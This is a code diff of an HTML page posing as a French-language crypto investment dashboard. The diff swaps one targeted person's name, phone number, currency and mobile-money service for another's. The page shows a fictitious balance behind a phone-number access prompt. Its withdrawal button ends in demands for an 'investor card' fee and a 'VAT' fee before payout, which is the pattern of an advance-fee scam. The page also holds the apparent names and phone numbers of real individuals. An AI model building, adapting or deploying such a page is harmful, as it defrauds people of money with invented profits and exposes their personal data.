@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Investissement - Crypto Trading</title>
+    <title>Trading Investissement - Crypto Trading</title>
     <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
     <style>
         body {
@@ -255,7 +255,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "661807223") {
+        if (code === "90298629") {
             document.body.style.display = 'block';
         } else {
             alert("numéro incorrect. Accès refusé.");
@@ -265,14 +265,14 @@
 
     <header>
         <div class="logo">
-            <h1>Africa Investissement</h1>
+            <h1>Trading Investissement</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 45 000 000 GNF</span>
+                <span class="balance">Solde: 5 500 000 FCFA</span>
                 <div class="account-info">
-                    <span id="user-name">Mamadou Alpha Kare Diallo</span><br>
-                    <span id="user-phone">224 661 80 72 23</span>
+                    <span id="user-name">ADOM AKLESSO</span><br>
+                    <span id="user-phone">228 90 29 86 29</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -301,7 +301,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via T-Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -334,17 +334,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Mamadou Alpha Kare Diallo";
-                const accountNumber = "224 661 80 72 23";
-                const balance = "45 000 000 GNF";
+                const accountName = "ADOM AKLESSO";
+                const accountNumber = "228 90 29 86 29";
+                const balance = "5 500 000 FCFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via T-Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Orange Money");
+                    setWithdrawalInfo("T-Money");
                 }
             });
 
@@ -356,7 +356,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Mamadou, veuillez taper sur ok et attendre afin recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher ADOM, veuillez payer les frais de carte d'\investisseur afin recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : frais de tva néccéssaire.';
